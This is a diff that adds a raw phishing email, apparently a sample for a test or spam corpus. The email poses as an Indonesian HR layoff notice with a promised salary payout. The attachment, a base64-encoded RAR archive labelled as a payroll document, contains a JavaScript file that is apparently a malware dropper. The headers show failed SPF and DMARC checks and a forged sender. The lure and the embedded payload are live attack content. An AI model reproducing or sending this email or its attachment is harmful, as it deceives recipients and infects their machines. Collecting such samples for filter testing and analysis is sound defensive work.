@@ -1,0 +1,122 @@
+Return-Path: <milesharris@testdomain.io>
+X-Original-To: drewjones@testmail.net
+Delivered-To: drewjones@testmail.net
+Received: from okusi0 (okusi0 [192.168.1.153])
+	by okusi0.okusi.co.id (Postfix) with ESMTP id 0CEA83340202
+	for <drewjones@testmail.net>; Thu, 17 Apr 2025 10:17:33 +0700 (WIB)
+Received: from okusi1 [192.168.1.151]
+	by okusi0 with IMAP (fetchmail-6.4.27)
+	for <drewjones@testmail.net> (single-drop); Thu, 17 Apr 2025 10:17:33 +0700 (WIB)
+Received: from okusi1.okusi.co.id
+	by okusi1 with LMTP
+	id tr++DZFyAGjf9g4AeHbnHg
+	(envelope-from <milesharris@testdomain.io>); Thu, 17 Apr 2025 10:16:33 +0700
+Authentication-Results: OpenDMARC; dmarc=fail (p=none dis=none) header.from=okusi.id
+Authentication-Results: OpenDMARC; spf=fail smtp.mailfrom=okusi.id
+Received: from skybeam3.hostnetwork.com (unknown [65.60.22.114])
+	by okusi1.okusi.co.id (Postfix) with ESMTPS id 981AC264002B
+	for <legmorganhill@testdomain.io>; Thu, 17 Apr 2025 10:16:31 +0700 (WIB)
+Received: from [69.166.9.181] (port=49951 helo=[181.9.166.69])
+	by aurora.ns.cloudflare.com with esmtpsa  (TLS1.3) tls TLS_AES_256_GCM_SHA384
+	(Exim 4.98.1)
+	(envelope-from <milesharris@testdomain.io>)
+	id 1u5Fjp-0000000HWPs-1c6h
+	for legmorganhill@testdomain.io;
+	Wed, 16 Apr 2025 23:16:29 -0400
+From: Departemen SDM okusi.id <milesharris@testdomain.io>
+To: legmorganhill@testdomain.io
+Subject: Status Pekerjaan Anda
+Date: 16 Apr 2025 20:16:27 -0700
+Message-ID: <1bf1aff9845a484a97f2a48f29180be2@testdomain.io>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_CB28F87B.443A8A36"
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - aurora.ns.cloudflare.com
+X-AntiAbuse: Original Domain - okusi.id
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - okusi.id
+X-Get-Message-Sender-Via: aurora.ns.cloudflare.com: authenticated_id: miles.allen@example.org
+X-Authenticated-Sender: aurora.ns.cloudflare.com: miles.allen@example.org
+X-Spam-Status: No, score=1.1 required=5.0 tests=HTML_MESSAGE,MAY_BE_FORGED,
+	MIME_HTML_ONLY,RCVD_IN_DNSWL_BLOCKED,RCVD_IN_MSPIKE_BL,
+	RCVD_IN_MSPIKE_L5,RCVD_IN_VALIDITY_CERTIFIED_BLOCKED,
+	RCVD_IN_VALIDITY_RPBL_BLOCKED,SPF_HELO_NONE,T_SPF_PERMERROR,
+	URIBL_BLOCKED autolearn=no autolearn_force=no version=3.4.6
+X-Spam-Level: *
+X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on okusi1.okusi.co.id
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_CB28F87B.443A8A36
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html>
+
+<html><head>
+    <title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+
+<body>
+    <p data-end=3D"81" data-start=3D"58"><strong data-end=3D"81" data-start=
+=3D"58">Kepada legmorganhill@testdomain.io,</strong></p>
+    <p data-end=3D"405" data-start=3D"83">Dengan menyesal kami informasikan=
+ bahwa akibat beban pajak yang sangat tinggi yang dikenakan pada perusahaan=
+ kami, kami tidak lagi mampu mempertahankan jumlah tenaga kerja kami saat i=
+ni. Oleh karena itu, kami telah mengambil keputusan yang sulit untuk melaku=
+kan pemutusan hubungan kerja (redundansi) di seluruh organisasi.</p>
+    <p data-end=3D"503" data-start=3D"407">Sayangnya, hal ini berarti kami =
+tidak dapat melanjutkan hubungan kerja Anda dengan okusi.id.</p>
+    <p data-end=3D"581" data-start=3D"505">Hari kerja terakhir Anda bersama=
+ kami adalah pada tanggal <strong data-end=3D"580" data-start=3D"563">19 Ap=
+ril 2025</strong>.</p>
+    <p data-end=3D"858" data-start=3D"583">Kami memahami dampak dari keputu=
+san ini terhadap Anda, dan sebagai bentuk itikad baik, kami telah melampirk=
+an pembayaran gaji Anda selama tiga bulan ke depan di muka untuk membantu A=
+nda dalam masa transisi ini. Rincian pembayaran akhir Anda tercantum dalam =
+dokumen terlampir.</p>
+    <p data-end=3D"1005" data-start=3D"860">Silakan temukan dokumen yang di=
+perlukan terkait pemutusan hubungan kerja Anda serta rincian pembayaran akh=
+ir gaji Anda yang telah kami lampirkan.</p>
+    <p data-end=3D"1277" data-start=3D"1007">Kami menghargai kontribusi And=
+a terhadap perusahaan dan menyesal bahwa kita harus berpisah dalam situasi =
+seperti ini. Jika Anda membutuhkan bantuan atau memiliki pertanyaan terkait=
+ paket pesangon Anda, jangan ragu untuk menghubungi Departemen SDM di <stro=
+ng data-end=3D"1276" data-start=3D"1257">milesharris@testdomain.io</strong>.</p>
+    <p data-end=3D"1350" data-start=3D"1279">Terima kasih atas pengertian d=
+an kerja sama Anda selama masa sulit ini.</p>
+    <p data-end=3D"1382" data-start=3D"1352"><strong data-end=3D"1368" data=
+-start=3D"1352">Hormat kami,</strong><br data-end=3D"1371" data-start=3D"13=
+68">Manajer SDM</p>
+    <p data-end=3D"1414" data-start=3D"1384"><strong data-end=3D"1397" data=
+-start=3D"1384">Tembusan:</strong> milesgarcia@testdomain.io</p>
+    <div class=3D"_1PykQrbOAi1vvEtfcvQEia" style=3D'border-width: 0px; marg=
+in: 0px; padding: 0px; color: rgb(50, 49, 48); text-transform: none; text-i=
+ndent: 0px; letter-spacing: normal; font-family: "Microsoft Yahei UI", Verd=
+ana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvet=
+ica Neue", sans-serif; font-size: 15px; font-style: normal; font-weight: 40=
+0; word-spacing: 0px; vertical-align: baseline; white-space: normal; widows=
+: 2; font-stretch: inherit; font-variant-caps:=20
+normal; font-variant-numeric: inherit; font-variant-east-asian: inherit; -w=
+ebkit-text-stroke-width: 0px; text-decoration-style: initial; text-decorati=
+on-color: initial;'><br></div>
+
+
+</body></html>
+------=_NextPart_000_0012_CB28F87B.443A8A36
+Content-Type: application/octet-stream; name="Status-Penerimaan-Gaji.tbz"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Status-Penerimaan-Gaji.tbz"
+
+UmFyIRoHAM+QcwAADQAAAAAAAAAH4XQgkD4AOAEAAIUGAAACYLaGtWgWkVodMxkAIAAAAFN0
+YXR1cy1QZW5lcmltYWFuLUdhamkuanMA8BNyPgnZEREL1cDWdB8H0yLEE1RBhUYGDV6B4Ue2
+Dpc7tt7uTnNwzNdeZkYFBGFBBQWB6BH+AehYFB8W3N8STsH+N53nsQ7kZMBye4Luiru6uyvH
+KC6KzC6C/j7wX9B9HGQ7h9uCAD2QQhzQcFRpU5ejeTc6k+fHLxb6bfdJc4U9fZJ6cknhyp5+
+2Z8Cebxlt9ObJ5d9HUzHaTACeeP4mOyoPv6wnTgaySqAyhuOa4VnrRhiYCgsn7ZrCyMEfkz8
+fGXvDVyTonsL3azejVisX26erU2QmI/1HMI7aJukL9Ni/EnXYL7E1BTKHOu5StWHIIoUNRUB
+QutQ/e5MPCwe2rzU8CgodK7C1E8Ycio1OFy//XN4XNOwmAs5Gm8/gCxOMmWxe5AfwfmxYBrk
+hGqHinX1kGhLex8LUS6vqsQ9ewBABwA=
+
+------=_NextPart_000_0012_CB28F87B.443A8A36--
